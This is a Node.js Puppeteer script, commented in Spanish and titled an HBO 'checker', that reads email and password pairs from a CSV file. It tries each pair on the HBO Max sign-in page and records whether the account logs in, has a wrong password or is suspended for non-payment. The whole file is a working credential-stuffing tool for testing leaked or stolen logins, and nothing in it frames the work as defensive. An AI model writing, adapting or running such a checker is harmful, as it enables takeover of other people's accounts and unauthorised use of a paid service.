const puppeteer = require('puppeteer');
const fs = require('fs');

function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
 }

function addCsv(email,comments) {
    const data = `${email},${comments}\n`
    fs.appendFile('Out.csv',data, (err) => {
        if (err) throw err;
    }); 
}

async function main() {
    // Leer el archivo CSV
    const data = await fs.promises.readFile('./hbo.csv', 'utf-8');

    // Convertir el contenido del archivo a un arreglo de filas
    const rows = data.split('\n');

    //Mensajes de bienvenida
    console.log('Bienvenido a Premium y Codigos HBO Checker')
    console.log('Iniciamos proceso');
    console.log('***********')
    console.log('')
    console.log('')

    // Recorrer cada fila del archivo
    for (const row of rows) {
        // Inicializar Puppeteer
        const browser = await puppeteer.launch({ headless: false });
        const page = await browser.newPage();

        // Separar las columnas de la fila
        const columns = row.split(',');

        // Definimos email y password
        const [email,password] = columns

        //Iniciamos proceso
        await page.goto("https://play.hbomax.com/signIn",
        {
            waitUntil:'networkidle0'
        })
        await page.type("#EmailTextInput",email)
        await page.type("#PasswordTextInput",password);
        await page.keyboard.press('Enter');
        await page.keyboard.press('Enter');

        //Revisamos contraseña incorrecta
        try {
            await page.waitForSelector("#dialogTitle",{timeout:3000})
            addCsv(email,"Contraseña Incorrecta");
            console.log(`${email}: Contraseña Incorrecta`);
            await browser.close()
            continue
        } catch (error) {
            {}
        }
        try {
            await page.waitForSelector("#root > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-eqz5dr.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af > div.css-175oi2r.r-13awgt0 > div > div > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af.r-12vffkv > div:nth-child(2) > div > div > div > div.css-175oi2r.r-13awgt0 > div > div > div > div:nth-child(2) > div.css-175oi2r.r-1oszu61.r-eqz5dr.r-1h0z5md > div.css-175oi2r.r-1awozwy.r-qizire.r-z2wwpe.r-18u37iz.r-1peese0.r-d9fdf6.r-1f1sjgu > div.css-175oi2r.r-13awgt0 > div > span",{timeout:3000})
            var badPass = await page.$eval("#root > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-eqz5dr.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af > div.css-175oi2r.r-13awgt0 > div > div > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af.r-12vffkv > div:nth-child(2) > div > div > div > div.css-175oi2r.r-13awgt0 > div > div > div > div:nth-child(2) > div.css-175oi2r.r-1oszu61.r-eqz5dr.r-1h0z5md > div.css-175oi2r.r-1awozwy.r-qizire.r-z2wwpe.r-18u37iz.r-1peese0.r-d9fdf6.r-1f1sjgu > div.css-175oi2r.r-13awgt0 > div > span", el => el.textContent);
            addCsv(`${email}: ${badPass}`)
            console.log(`${email}: ${badPass}`)
            await browser.close()
            continue
        } catch (error) {
            {}
        }
        //Revisamos si no pasa del login
        try {
            while ({}) {
                var Login = await page.$eval("#root > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-eqz5dr.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af > div.css-175oi2r.r-1hpgsb4.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af.r-184en5c.r-633pao > div:nth-child(2) > div.css-175oi2r.r-1awozwy.r-18u37iz.r-1r8g8re.r-17s6mgv.r-bztko3.r-1qhn6m8.r-105ug2t > a:nth-child(2)", el => el.textContent);
                if (Login == "Iniciar sesión") {
                    await page.keyboard.press('Enter');
                    await delay(5000)
                }else{
                    break
                }
            }
        } catch (error) {
            {}
        }      

        // Ingresamos al Perfil
        await page.waitForSelector("#root > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-eqz5dr.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af > div.css-175oi2r.r-13awgt0 > div > div > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af.r-12vffkv > div:nth-child(2) > div > div > div > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-150rngu.r-eqz5dr.r-16y2uox.r-1wbh5a2.r-11yh6sk.r-1rnoaur.r-1sncvnh > div > div > h1 > div > div")
        await page.keyboard.press('Tab'); 
        await page.keyboard.press('Enter');        

        //Revisamos Si esta suspendida
        try {
            await page.waitForNavigation({waitUntil:'load'});
            await delay(1500)
            // await page.waitForSelector("#root > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-eqz5dr.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af > div.css-175oi2r.r-13awgt0 > div > div > div.css-175oi2r.r-13awgt0 > div:nth-child(2) > div.css-175oi2r.r-1p0dtai.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af.r-12vffkv > div:nth-child(2) > div > div > div > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-150rngu.r-eqz5dr.r-16y2uox.r-1wbh5a2.r-11yh6sk.r-1rnoaur.r-1sncvnh > div > div > div > div.css-175oi2r.r-eqz5dr.r-zd98yo.r-u01est",{timeout:3000})
            await page.$eval("#root > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-1p0dtai.r-eqz5dr.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af > div.css-175oi2r.r-13awgt0 > div > div > div.css-175oi2r.r-13awgt0 > div:nth-child(2) > div.css-175oi2r.r-1p0dtai.r-1d2f490.r-u8s1d.r-zchlnj.r-ipm5af.r-12vffkv > div:nth-child(2) > div > div > div > div.css-175oi2r.r-13awgt0 > div > div.css-175oi2r.r-150rngu.r-eqz5dr.r-16y2uox.r-1wbh5a2.r-11yh6sk.r-1rnoaur.r-1sncvnh > div > div > div > div.css-175oi2r.r-1wzrnnt > div > div > div > span", el => el.textContent);
            addCsv(email,"Suspendido por falta de pago");
            console.log(`${email}: Suspendido por falta de pago`);
            await browser.close()
            continue
        }catch (error){
            {}
        }

        
    }
    // Cerrar el navegador
        await browser.close();
    //Mensajes de Despedida
    console.log('')
    console.log('')
    console.log('***********')
    console.log("Terminando proceso...");
    browser.close();
    console.log("Termino correctamente");
}

main();
